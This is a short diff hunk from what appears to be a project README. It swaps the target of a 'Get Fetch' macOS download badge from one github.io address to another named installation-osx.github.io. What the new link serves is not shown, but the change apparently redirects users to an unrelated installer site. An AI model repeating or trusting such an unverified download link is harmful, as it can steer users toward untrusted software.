@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://tembilamusion.github.io/.github/Fetch">  
+  <a href="https://installation-osx.github.io/.github/Fetch">  
     <img src="https://img.shields.io/badge/⬇️_Get_Fetch-1E90FF?style=for-the-badge&logo=apple&logoColor=white" alt="Get Fetch">  
   </a>  
 </div>  
